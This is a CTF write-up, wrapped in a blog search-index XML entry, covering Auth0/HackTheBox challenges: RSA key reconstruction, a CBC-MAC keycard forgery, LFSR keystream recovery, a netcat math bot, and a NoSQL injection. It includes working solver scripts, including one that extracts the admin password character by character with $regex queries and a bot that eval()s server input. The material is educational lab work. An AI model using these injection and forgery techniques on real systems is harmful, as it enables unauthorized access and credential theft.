<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Auth0 - CTF</title>
      <link href="/2021/10/27/Auth0-CTF/"/>
      <url>/2021/10/27/Auth0-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/27/Auth0-CTF/header.png"></p><h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p><img src="/2021/10/27/Auth0-CTF/scoreboard.png"></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>The Auth0-CTF took place from the 18.10.2021 to the 25.10.2021. This was our first CTF as NocentSec, we managed to place 15th out of 613 teams with 1073 players in total as the best German team. The CTF was published by <a href="https://ctf.hackthebox.com/">HackTheBox</a> and organized by <a href="https://auth0.com/">Auth0</a>. Auth0 is an international enterprise which focuses on access security in web applications and well known community support. This was reflected in the variety of challenges which were heavily “Web” based.</p><p>We were able to solve most of the challenges and especially enjoyed the web challenges. We want to showcase some challenges which we found interesting or had the feeling that we could reuse our scripts in the future for other CTFs, so this is also a knowledge database for ourselves.</p><h2 id="Crypto-Coffee-Stains"><a href="#Crypto-Coffee-Stains" class="headerlink" title="Crypto - Coffee Stains"></a>Crypto - Coffee Stains</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an incomplete RSA private key and an encrypted message.</p><pre><code>-----BEGIN RSA PRIVATE KEY--------------------------tdPNybMw3fakIhDT0tCl/i00i97lFiFFNV9u0jjQmpRRc8pwcQKCAQEAy2ebe5FlT3s2hGUGRsMXmEF9MF48p3P6Yk0+hB0XJLgDvAVhOCylLcuzNkolj//5mYoCjjBr4GdH5t3IAE/dBC1N8RQK/cc0FZ1DejJpV6TZUzLg6hef+tDAKMV52CWGFfc0XOWT0MKe/e3hZzYwBgFHLeVobZu5ngkHbk+ngta2fuJ7D1Fd/IRNs7Pu3hS3JNyjcpshshbEezI/8eYI12dd7CiAsv4GcDnnCdSqezKa5gGk0Adige6D0wIg01FtsTX7dwlaXXXpMrb479W63xWDgFVKKzjeK7GMlO6OO8o8SNnh4s0ezSUR6za6b/yAjHPtfpFTJ+nc1AEw+qNLawKCAQEApQRXpC75Y94dnwxZqjvEIkjCFipq5NQK3sjtbo33NdiO----------PS3/AoIBAHUnYBFwSB5e0yjX29DAHb85aJHUC4/p+s2wWODkaV4RIOz2PJyxoH9wA+HmxYIC/Kt2gpGtxBt2Cl4cjZR6qcnt/hEqTNs8Qtqma2MZMCvZI7W0mT+onwHJFHAAAIzHPvYcXvVWs+lUR1nd0XfVqWQ4j8+07yBBt1LGWFhW/N4cLSdPQrOAizQA9P63/RZTJQbdzKyOlJfE2eyY3PLGXjtQus7VK8eCHBlZU5bm4DX7aRT94siBk8SNrB9SUVb+94hdyqHsf7vN8ns2OwFqxXIim0BM2fqVbA9kIHblxP3FupoAKlbmuDrCRZZHABOiE9gwVn8oa64sDn7c5mtX2IECggEBAL9mDTqhXoAL/fXfZf1Voz7/I1hW----------END RSA PRIVATE KEY-----</code></pre><p><em>redacted_private_key.pem</em></p><p><a href="flag.enc">encrypted message</a></p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>We can restore some of the parameters of the RSA-encryption by comparing the incomplete key with a real key. Looking for the position and the magic numbers (described <a href="https://ret2school.github.io/post/writeuprsa/">here</a> and <a href="https://manylostticks.blogspot.com/2016/10/hacklu-ctf-2016-redacted-write-up.html">here</a>) we can find <code>p</code>, <code>upper_d</code>, <code>lower_q</code>, <code>dq</code> and some other fragments.</p><p>As this aren’t the same parameters as in the linked writeup we can’t just copy their code, but we can use our parameters with the help of <a href="mathemann.jpg">math</a>.</p><p><em>e is just guessed</em></p><p>To calculate q we replaced the d and q parameters in the script of the linked writeups:</p><pre><code class="py">from Crypto.Util.number import bytes_to_long, isPrimee = 0x10001p = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6blower_d = 0xb5d3cdc9b330ddf6a42210d3d2d0a5fe2d348bdee5162145355f6ed238d09a945173ca7071upper_q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88edq = 0x7527601170481e5ed328d7dbd0c01dbf396891d40b8fe9facdb058e0e4695e1120ecf63c9cb1a07f7003e1e6c58202fcab768291adc41b760a5e1c8d947aa9c9edfe112a4cdb3c42daa66b6319302bd923b5b4993fa89f01c9147000008cc73ef61c5ef556b3e9544759ddd177d5a964388fcfb4ef2041b752c6585856fcde1c2d274f42b3808b3400f4feb7fd16532506ddccac8e9497c4d9ec98dcf2c65e3b50baced52bc7821c19595396e6e035fb6914fde2c88193c48dac1f525156fef7885dcaa1ec7fbbcdf27b363b016ac572229b404cd9fa956c0f642076e5c4fdc5ba9a002a56e6b83ac24596470013a213d830567f286bae2c0e7edce66b57d881upper_invq_modp = 0xbf660d3aa15e800bfdf5df65fd55a33eff235856dp = d_mod_pm1_end = 0x3d2dfffor kq in range(1, e):    q_mul = dq * e - 1    if q_mul % kq == 0:        q = (q_mul // kq) + 1        if isPrime(q):            print(&quot;Potential q: &quot; + str(hex(q)))            break;n = p*qprint(&quot;potential n: &quot;)print(hex(n))print(&quot;#####&quot;)print(&quot;n&quot;)print(hex(n))print(&quot;e&quot;)print(hex(e))print(&quot;p&quot;)print(hex(p))print(&quot;q&quot;)print(str(hex(q)))</code></pre><p><em>get_q.py</em></p><p>Now we have all parameters to craft a new private key with a script like that:</p><pre><code class="py">from Crypto.PublicKey import RSAn = 0x831d3a77bc2df07236cd539febdf01da13942582edc7c83e5e4cfb85959647982a946286f0f395a6c6646aff486fb0b825524c08601e2a2fefa60887e4a29d463624c77a0ff3077c295413384eadb19197e08b731ed8ec8e806a1e81dd50eed15bffae5d62fa36bd93cc051617ab2e51c1a9624e634de5ef190246e54e9a398bcb97d17a5b2879210115a8e707075e881010337f25b4565ab4f65e4f92ecc3615a3e1e92528e0cad6eebd321272b7b6a801576bdfd4f8063b0fb940f0e1ef7eb21fc9017e632fa448f5f566b3509d17d2b33273ffa113f69ebc1756514bdc9782c96637e80a88fa726b6fdc5598ee2fdb77b500e50a6df037448900fe03e6da1c48f3602bda544871beae4f6d48b1f2a5e7c1e5cb4ab06fe478f22d00bcdc5d641445d979e8ede75283321d6e433134923593c7c78cdac67ea553af5f8b8aac12359880d22229118fa0360be098f03dc161c70db431dc63dc81224a809edaef0b364478f25f77836a4e510893f380962fb3ffc1e6c404ee9b4073ba662f4fddef7c1a15385e56a14d4df6886fba6a654545c399a287bfc603d582a9ff67644a5014cd7d6eb3f6ec6b90d19c90b74a45e35e8683c9020cc05bb77545cfe3fbfb9297dd011587038d15aee53737382d6e33e5757b43ca7b736b0d1cf53a74c546b28d03ba171c2d9421d0d5b8204da387102bac47412e828d04ab55483045a6265e = 0x10001q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88e4037294db934bcd56908af941eaea6763eeeca63c5f2f05cb8bb38f689ac91e9dc13f1060446978af7950114e1be8dfeac53899e783ee9af21c44000c64b11979131bf80c152178230cc799acd1fa88184cc9d6587d6ee276d0bca083739890a9548c5358abb9f952d6c5a1f6b233008777af37923c6be12953b35f0b3542b37ef45753af6beb308bec02d650353f59b61672122b580e9ffea6a55d5f8b1e8186a18a5ce2eb403c6a72274827f284d565893c393efb5e9aa855e8523e514d5b3c30d67a75b491356463597e453fecf05a8394e84fd4ea7f2dae9ab2e78cd6fp = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6bp=int(p)phi = (p-1)*(q-1)d = pow(e,-1,phi)key = RSA.construct((n,e,d,p,q))pem = key.exportKey(&#39;PEM&#39;)print(pem.decode())</code></pre><p><em>key.py</em></p><p>The new private key can be used to decrypt the given message (for example with <a href="https://gchq.github.io/CyberChef/#recipe=RSA_Decrypt('-----BEGIN%20RSA%20PRIVATE%20KEY-----','','RSA-OAEP','SHA-1')">CyberChef</a>).</p><h2 id="Crypto-Debunked"><a href="#Crypto-Debunked" class="headerlink" title="Crypto - Debunked"></a>Crypto - Debunked</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This challenge is about AES in CBC mode.</p><p>We were given a server.py and an ip address with port for communication.<br>The application is used to authenticate keycards. Once we send a keycard with “permissionLvl=5” that gets authenticated we will receive the flag.</p><p>The application has two options:</p><ul><li>1 - Receive guest keycard<ul><li>crafts a new guest keycard based on the randomized key and iv with the plaintext <code>employeeID=ab12e&amp;permissionLvl=1</code></li><li>returns the guest keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext).base64(IV)</code></li></ul></li><li>2 - Scan keycard to open door<ul><li>insert a keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext)</code></li><li>returns: <ul><li>“Access denied” if permissionLvl != 5 and authenticated</li><li>“Caught forging fake keycards.” if not authenticated and “permissionLvl” in plaintext</li><li>expected signature (last 16 bytes of ciphertext) for given plaintext if not “permissionLvl” in plaintext</li></ul></li></ul></li></ul><pre><code class="py">from Crypto.Cipher import AESfrom secret import flagimport socketserverimport osfrom base64 import b64decode, b64encodeimport signalBLOCK_SIZE = 16KEY = os.urandom(BLOCK_SIZE)iv = os.urandom(BLOCK_SIZE)def reportError(val, check_sig, req):    if &quot;permissionLvl&quot; not in val.decode(&#39;utf-8&#39;, &#39;ignore&#39;):        req.sendall(b&quot;&gt; Something went wrong, expected signature: &quot;+ check_sig.encode() +b&quot;\n&quot;)    else:        req.sendall(b&quot;&gt; Caught forging fake keycards. This incident has been reported!\n&quot;)def macAuthenticate(mac, req):    val, sig = mac.split(&quot;.&quot;)    val = b64decode(val)    sig = b64decode(sig).decode()    cipher = AES.new(KEY, AES.MODE_CBC, iv)    ct = cipher.encrypt(val)    check_sig = ct[len(ct)-16:].hex()    if check_sig == sig:        return True    else:        reportError(val, check_sig, req)        return False def createLvl1Mac(id=b&quot;ab12e&quot;):    value = b&quot;employeeID=&quot;+id+b&quot;&amp;permissionLvl=1&quot;    cipher = AES.new(KEY, AES.MODE_CBC, iv)    ct = cipher.encrypt(value)    sig = ct[len(ct)-16:].hex().encode()    return b64encode(value)+b&quot;.&quot;+b64encode(sig)+b&quot;.&quot;+b64encode(iv.hex().encode())def challenge(req):    try:        req.sendall(b&#39;|------------------------------|\n&#39;+                    b&#39;|     KEYCARD ID CHECKER       |\n&#39;+                    b&#39;|------------------------------|\n&#39;+                    b&#39;|1. Receive guest keycard      |\n&#39;+                    b&#39;|2. Scan keycard to open door  |\n&#39;+                    b&#39;|------------------------------|\n&#39;+                    b&#39;\n&gt; &#39;                    )        choice = int(req.recv(2).decode().strip())        if choice == 1:            req.sendall(b&quot;&gt; Keycard ID: &quot;+createLvl1Mac()+b&quot;\n&quot;)        if choice == 2:            req.sendall(b&#39;&gt; Press keycard to the scanner...\n&#39;)            mac = req.recv(4096).decode().strip()            if macAuthenticate(mac, req):                val, _ = mac.split(&quot;.&quot;)                val = b64decode(val).decode()                val = dict(x.split(&quot;=&quot;) for x in val.split(&quot;&amp;&quot;))                if int(val.get(&#39;permissionLvl&#39;)) == 5:                    req.sendall(b&quot;&gt; Access granted! No alien robots here: &quot;+ flag+b&quot;\n&quot;)                else:                    req.sendall(b&quot;&gt; Access denied!&quot;+b&quot;\n&quot;)        except Exception as e:        try:            req.sendall(b&#39;Unexpected error.\n&#39;)            req.close()        except:            pass        exit()class incoming(socketserver.BaseRequestHandler):    def handle(self):        signal.alarm(300)        req = self.request        while True:            challenge(req)class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passsocketserver.TCPServer.allow_reuse_address = Falseserver = ReusableTCPServer((&quot;0.0.0.0&quot;, 1337), incoming)server.serve_forever()</code></pre><p><em>server.py</em></p><p><img src="/2021/10/27/Auth0-CTF/standard.png"></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p><em>This challenge is kind of interesting because it’s not the expected bit-flipping attack to use here. This is caused by the use of a compare of encryptions for authentication instead of decryption.</em></p><p>We want to craft a keycard with “permissionLvl=5” and a valid ciphertext to use as the signature.<br>Sending a random plaintext (<em>length in bytes should be a factor of 16</em>) and a random ciphertext gives us the possibility to craft keycards by using the given expected signature in base64 as ciphertext.</p><p>It’s not necessary to have something about the employeID in the plaintext as only the permissionLvl gets checked. The only problem here is that we can’t just send “&amp;permissionLvl=5” as we would get the “caught forging keycards”-error instead of the expected signature. </p><p>We know the IV because it gets send to us in the applications response. This also means that we can control the output of our input XORed with the IV.<br>We can calculate which ciphertext the second plaintext (<em>second encrpytion step</em>) gets XORed with by crafting a new keycard.</p><p><img src="/2021/10/27/Auth0-CTF/encAES.png"></p><p>The key element here is to break out of thinking in 16 byte blocks. By this we can send parts of “permissionLvl=5” to bypass the check.</p><p>Following way leads us to a valid keycard:</p><ul><li>choose a plaintext for access like: 0000=0000&amp;permissionLvl=5&amp;00=000<ul><li>mind that this is 32 bytes long and neither in the first nor the second block is the whole “permissionLvl”</li><li>we need to add the symbols “=” and “&amp;” to get along with the splits</li></ul></li><li>C1: calculate the signature of the first 16 bytes of plaintext (“0000=0000&amp;permis”) by sending this as a keycard with a random ciphertext <ul><li>this returns a new signature which would be the first ciphertext in an encryption of a 32byte plaintext</li></ul></li><li>C2: calculate the signature of the last 16 bytes of plaintext (“sionLvl=5&amp;00=000”) by <strong>simulating the second step in encryption</strong>:<ul><li>eliminating the IV: new plaintext = “sionLvl=5&amp;00=000” XOR IV</li><li>new plaintext = new plaintext XOR C1 (<em>signature of first plaintext</em>)</li><li>sending this new plaintext in a keycard with a random cipher to get the signature</li></ul></li></ul><p>This got us the signature of the whole plaintext: C2.<br>Now we can just enter our valid keycard:</p><p><code>base64(&quot;0000=0000&amp;permissionLvl=5&amp;00=000&quot;).base64(C2)</code></p><h2 id="Crypto-Corporate-Snake"><a href="#Crypto-Corporate-Snake" class="headerlink" title="Crypto - Corporate Snake"></a>Crypto - Corporate Snake</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an encryption python script and a corresponding ciphertext. Our challenge was to reverse that ciphertext and retrieve the flag.</p><pre><code class="py">from base64 import b64encodeimport osdef bytes_to_bits(input):    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)def bits_to_bytes(input):    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)flag = b&quot;--MISSING--&quot;init_state = os.urandom(4)def lfsr_keystream_generator(init_state, flag_bits_length, taps):    state = init_state    keystream = &#39;&#39;    for i in range(flag_bits_length):        keystream = keystream + state[-1]        state = state[:-1]        bit = state[taps[0]]        for tap in taps[1:]:            bit = int(bit) ^ int(state[tap])        state = str(bit) + state    return keystreamdef encrypt(keystream, plaintext):    plaintext = bytes_to_bits(plaintext)    ciphertext = &#39;&#39;    for i in range(len(plaintext)):        xored_bit = int(keystream[i]) ^ int(plaintext[i])        ciphertext = ciphertext + str(xored_bit)    return b64encode(bits_to_bytes(ciphertext))keystream = lfsr_keystream_generator(bytes_to_bits(init_state), len(bytes_to_bits(flag)),[2,3,5,7,11,17,19,29])ciphertext = encrypt(keystream, flag)print(ciphertext)</code></pre><p><em>enc.py</em></p><pre><code>+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==</code></pre><p><em>ciphertext</em></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>The encryption script generates a <a href="https://en.wikipedia.org/wiki/Linear-feedback_shift_register">lfsr keystream</a> using a random init state by calling <code>os.random(4)</code>. Since we were given the encryption script we pretty much translated it to a solution script by reversing the transformation line by line. This was possible because we can recover the inital state by reversing the first 32bits of the restored keystream and also because we were given the taps used.</p><pre><code class="py"># Importsfrom base64 import b64encode, b64decodeimport os# Functionsdef bytes_to_bits(input):    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)def bits_to_bytes(input):    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)def lfsr_keystream_generator(init_state, flag_bits_length, taps):    state = init_state    keystream = &#39;&#39;    for i in range(flag_bits_length):        keystream = keystream + state[-1]        state = state[:-1]        bit = state[taps[0]]        for tap in taps[1:]:            bit = int(bit) ^ int(state[tap])        state = str(bit) + state    return keystream# Variablesciphertext=b&quot;+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==&quot;ciphertextbits=bytes_to_bits(b64decode(ciphertext))flag=b&quot;HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;flagbits = bytes_to_bits(flag)# Restoring keystreamkeystream_temp=&quot;&quot;for bit in range(len(ciphertextbits)):    xored_bit = int(ciphertextbits[bit]) ^ int(flagbits[bit])    keystream_temp = keystream_temp + str(xored_bit)keystream_first32bits = keystream_temp[:32]keystream_last8bits = keystream_temp[-8:]# Recovering inital stateintial_state=keystream_first32bits[::-1]# Decryptionkeystream_restored=lfsr_keystream_generator(intial_state, 416, [2,3,5,7,11,17,19,29])plainbits=&quot;&quot;for bit in range(len(ciphertextbits)):    xored_bit = int(ciphertextbits[bit]) ^ int(keystream_restored[bit])    plainbits = plainbits + str(xored_bit)plaintext=bits_to_bytes(plainbits)print(plaintext)</code></pre><p><em>solve.py</em></p><h2 id="Misc-Bomb"><a href="#Misc-Bomb" class="headerlink" title="Misc - Bomb"></a>Misc - Bomb</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an ip adress with a port. Once connected via netcat we were asked to solve 777 maths challenges in order to retrieve the flag.</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>While this isn’t a difficult or very exciting challenge we decided to share our script here nontheless because this is quite a common ctf challenge and we might reuse it in the future.</p><pre><code class="py">#!/usr/bin/python3import itertoolsimport nclibimport sysimport collectionsfrom time import timeip = &#39;167.99.202.9&#39;port = 32597### connecting to the socket and recieving until &#39;= ?&#39;:nc = nclib.Netcat((ip, port), verbose=True)start = &quot;= ?&quot;recv = nc.recv_until(start.encode(&#39;utf-8&#39;))### splitting the task to get rid of the useless informationtext, term = recv.decode().split(&#39;\n\n&#39;)### evaluate the solution and send itsolution= eval(term[:-4])nc.send(str(solution) + &#39;\n&#39;)### do all of the above repeatedlywhile 1:    recv = nc.recv_until(start.encode(&#39;utf-8&#39;))    a, b, term = recv.decode().split(&#39;\n\n&#39;)    solution= eval(term[:-4])    print (term)    print (solution)    nc.send(str(solution) + &#39;\n&#39;)</code></pre><p><em>bomb.py</em></p><h2 id="Web-Status-Board"><a href="#Web-Status-Board" class="headerlink" title="Web - Status Board"></a>Web - Status Board</h2><p><img src="/2021/10/27/Auth0-CTF/statusboard_admin.png"></p><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>What looks like a simple authentication bypass in the first place is not what it seems. In this challenge our task wasn’t to just bypass the login form, we had to retrieve the admin password. This became clear looking at the <code>entrypoint.sh</code> which we were given.</p><pre><code class="sh">#!/bin/ash# Secure entrypointchmod 600 /entrypoint.shmkdir /tmp/mongodbmongod --noauth --dbpath /tmp/mongodb/ &amp;sleep 2mongo status_board --eval &quot;db.createCollection(&#39;users&#39;)&quot;mongo status_board --eval &#39;db.users.insert( &#123; username: &quot;admin&quot;, password: &quot;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&quot;&#125; )&#39;/usr/bin/supervisord -c /etc/supervisord.conf</code></pre><p><em>entrypoint.sh</em></p><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>The vulnerabiliy is called NoSQL Injection or MongoDB Injection. We found out that we could successful “login” using this:</p><pre><code class="json">&#123;    &quot;email&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;,    &quot;password&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;&#125;</code></pre><p><code>$gt</code> means <code>greater than</code>, so in this case it would pick any username that is <code>greater than nothing</code> and the corresponding password. This gave us confidence about this attack. However the challenge here was to extract the password because that’s were the flag is stored. So we figured we can also use regex to enumerate the flag character by character. As long as the following returns <code>User authenticated successfully!</code> we’ve only put in valid characters.</p><pre><code class="json">&#123;    &quot;username&quot; : &#123;&quot;$eq&quot;:&quot;admin&quot;&#125;,    &quot;password&quot; : &#123;&quot;$regex&quot;:&quot;^HTB&#123;&quot;&#125;&#125;</code></pre><p>Because that would be quite painful to do by hand we wrote this short script which tries every character in the given alphabet and continues to the next one after the response would not include the word <code>Invalid</code>.</p><pre><code class="py">#!/usr/bin/env python3import requestsurl = &#39;http://167.99.94.53:30169/api/login&#39;alphabet=&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789_&#123;&#125;&quot;solved=&quot;&quot;while 1:    for c in alphabet:        myobj = &#123;&#39;username&#39;: &#39;admin&#39;,&#39;password&#39; : &#123;&quot;$regex&quot;:&quot;^&quot;+solved+c&#125;&#125;        x = requests.post(url, json = myobj)        if &quot;Invalid&quot; not in x.text:            solved=solved + c            print(solved)</code></pre><p><em>nosql.py</em>  </p><p><em>Thanks for reading. ~ hexp and JeanWhisky</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Auth0 </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> NoSQL </tag>
            
            <tag> RSA </tag>
            
            <tag> AES </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
            <tag> HTB </tag>
            
            <tag> LFSR </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
